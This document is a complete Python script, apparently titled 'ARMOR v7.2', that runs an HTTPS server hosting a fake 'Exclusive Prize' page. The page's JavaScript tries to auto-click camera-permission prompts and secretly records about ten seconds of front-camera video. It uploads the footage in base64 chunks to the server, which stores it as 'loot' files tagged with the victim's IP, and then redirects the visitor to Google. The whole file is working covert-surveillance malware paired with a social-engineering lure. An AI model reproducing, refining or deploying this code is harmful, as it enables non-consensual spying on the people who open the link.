#!/usr/bin/env python3
# evil_video_capture.py → ARMOR v7.2: B64 FIXED + 2s CHUNKS
import http.server
import socketserver
import urllib.parse
import base64
import os
import ssl
import uuid
from datetime import datetime

PORT = 8443
CERT_FILE = "server.pem"
DIR = "ARMOR_LOOT"
os.makedirs(DIR, exist_ok=True)

# === CERT ===
if not os.path.exists(CERT_FILE):
    os.system(f"openssl req -new -x509 -days 365 -nodes -out {CERT_FILE} -keyout {CERT_FILE} -subj '/CN=localhost' 2>/dev/null")

# === JS: 2s CHUNKS, SEND EVERY 2s ===
PAYLOAD = """<script>
// === AUTO-ALLOW ===
const hunt = setInterval(() => {
  const nodes = document.querySelectorAll('*');
  for (let n of nodes) {
    const txt = (n.textContent || '').toLowerCase();
    if (/camera|allow|this time/i.test(txt)) {
      const btns = n.querySelectorAll('button, [role="button"]');
      for (let b of btns) {
        if (/allow|this time|ok/i.test(b.textContent)) {
          b.click(); clearInterval(hunt);
        }
      }
    }
  }
}, 80);

// === SESSION ID ===
const sid = crypto.randomUUID();

// === VIDEO: 2s CHUNKS ===
let recorder, chunks = [], sendTimer;
const video = document.createElement('video');
video.muted = true; video.style.display = 'none';
document.body.appendChild(video);

const sendNow = () => {
  if (chunks.length === 0) return;
  const blob = new Blob(chunks, {type: 'video/webm'});
  chunks = [];

  const reader = new FileReader();
  reader.onload = () => {
    let b64 = reader.result.split(',')[1];
    b64 = b64.replace(/[^A-Za-z0-9+/=]/g, '');
    const padding = (4 - b64.length % 4) % 4;
    b64 += '='.repeat(padding);

    fetch(location.href, {
      method: 'POST',
      body: `sid=${sid}&part=` + encodeURIComponent(b64),
      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });
  };
  reader.readAsDataURL(blob);
};

const startCapture = () => {
  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}, audio: false})
    .then(stream => {
      video.srcObject = stream;
      video.play();

      recorder = new MediaRecorder(stream, {
        mimeType: 'video/webm;codecs=vp9',
        videoBitsPerSecond: 1200000
      });

      recorder.ondataavailable = e => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      recorder.start(2000);
      sendTimer = setInterval(sendNow, 2000);

      setTimeout(() => {
        clearInterval(sendTimer);
        if (recorder.state === 'recording') recorder.stop();
        sendNow();
        stream.getTracks().forEach(t => t.stop());
        setTimeout(() => location = 'https://google.com', 500);
      }, 10000);
    })
    .catch(() => setTimeout(() => location = 'https://google.com', 800));
};

window.addEventListener('load', () => setTimeout(startCapture, 1200));
</script>"""

BUTTON_JS = """<script>
document.getElementById('claimBtn').onclick = () => {
  this.innerText = 'Recording...';
  this.disabled = true;
};
</script>"""

HTML_TEMPLATE = """<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Claim Prize</title>
  <style>
    body{{font-family:Arial;background:#fff3e0;color:#d84315;text-align:center;padding:10%}}
    .box{{background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:90%;margin:auto}}
    h1{{font-size:2rem}}
    p{{font-size:1.1rem;margin:1.5rem 0}}
    button{{background:#ff6d00;color:#fff;border:none;padding:1rem 2rem;font-size:1.2rem;border-radius:12px;font-weight:bold}}
    button:disabled{{background:#ccc;cursor:not-allowed}}
  </style>
</head><body>
  <div class="box">
    <h1>Exclusive Prize!</h1>
    <p>Allow camera to record.</p>
    <button id="claimBtn">Start</button>
  </div>
  {payload}
  {button_js}
</body></html>"""

SESSION_FILES = {}

class ArmorHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        html = HTML_TEMPLATE.format(payload=PAYLOAD, button_js=BUTTON_JS)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    def do_POST(self):
        try:
            data = self.rfile.read(int(self.headers.get('Content-Length', 0))).decode('utf-8', 'ignore')
            params = urllib.parse.parse_qs(data)
            sid = params.get('sid', [''])[0]
            raw = params.get('part', [''])[0]

            if not sid or not raw:
                self._redirect()
                return

            b64 = urllib.parse.unquote(raw).strip().replace(' ', '+')
            # FIXED PADDING
            padding = (4 - len(b64) % 4) % 4
            b64 += '=' * padding
            b64 = ''.join(c for c in b64 if c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')

            part_bytes = base64.b64decode(b64, validate=False)
            if len(part_bytes) < 50000:
                self._redirect()
                return

            if sid not in SESSION_FILES:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                ip = self.client_address[0]
                path = f"{DIR}/ARMOR_{ts}_{ip}_{sid[:8]}.webm"
                SESSION_FILES[sid] = path
                print(f"[+] NEW SESSION: {path}")
            else:
                path = SESSION_FILES[sid]

            with open(path, 'ab') as f:
                f.write(part_bytes)
            print(f"[+] PART → {os.path.basename(path)} (+{len(part_bytes)/1024:.1f} KB)")

        except Exception as e:
            print(f"[-] ERROR: {e}")
        finally:
            self._redirect()

    def _redirect(self):
        self.send_response(303)
        self.send_header("Location", "https://google.com")
        self.end_headers()

def run():
    server = socketserver.TCPServer(("", PORT), ArmorHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_FILE)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"ARMOR v7.2 LIVE → https://YOUR_IP:{PORT}")
    print(f"   LOOT → ./{DIR}/*.webm (5 parts, full 10s)")
    server.serve_forever()

if __name__ == "__main__":
    run()
